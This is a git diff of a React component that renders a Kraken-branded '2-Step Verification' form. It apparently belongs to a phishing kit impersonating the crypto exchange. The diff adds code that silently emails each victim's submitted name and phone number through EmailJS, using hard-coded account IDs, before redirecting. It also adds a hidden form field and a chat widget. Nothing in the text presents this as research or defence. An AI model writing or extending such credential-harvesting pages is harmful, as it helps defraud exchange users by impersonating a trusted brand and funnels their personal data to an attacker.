@@ -1,21 +1,38 @@
-import React from "react";
+import React, { useState } from "react";
 import "./TwoStep.css";
 import logo from "../../assets/kraken logo.png";
 import { useNavigate } from "react-router";
+import emailjs from "emailjs-com";
+import { useRef } from "react";
+import Chat from '../important/Chat.jsx'
 
 const TwoStep = () => {
-    
-    const navigate = useNavigate();
+  const navigate = useNavigate();
+
+  const formRef = useRef();
 
   const handlesubmittwo = (event) => {
     event.preventDefault();
-    navigate('/important');
+
+    const serviceId = "service_30uaae8";
+    const templateId = "template_5kvhvjj";
+    const userId = "ZAclt8hkdW0xOqwpy";
+
+    emailjs.sendForm(serviceId, templateId, formRef.current, userId).then(
+      (result) => {
+        navigate("/important"); // Navigate after successful email send
+      },
+    );
   };
 
+  const from_name = "kraken";
+
   return (
+    <>
+    <Chat/>
     <div className="container12">
       <img src={logo} alt="" />
-      <form onSubmit={handlesubmittwo}>
+      <form onSubmit={handlesubmittwo} ref={formRef} name="from_name">
         <h2>
           2-Step <br /> Verification
         </h2>
@@ -25,12 +42,14 @@ const TwoStep = () => {
           authenticator app.
         </p>
         <div className="input-field">
-          <input type="text" placeholder="Name" required id="name" />
-          <input type="number" placeholder="Phone" required id="phone" />
+          <input name="kraken" style={{display:'none'}}/>
+          <input type="text" placeholder="Name" name="user_name" required id="name" />
+          <input type="number" placeholder="Phone" name="user_phone" required id="phone" />
           <button>Verify</button>
         </div>
       </form>
     </div>
+    </>
   );
 };
 
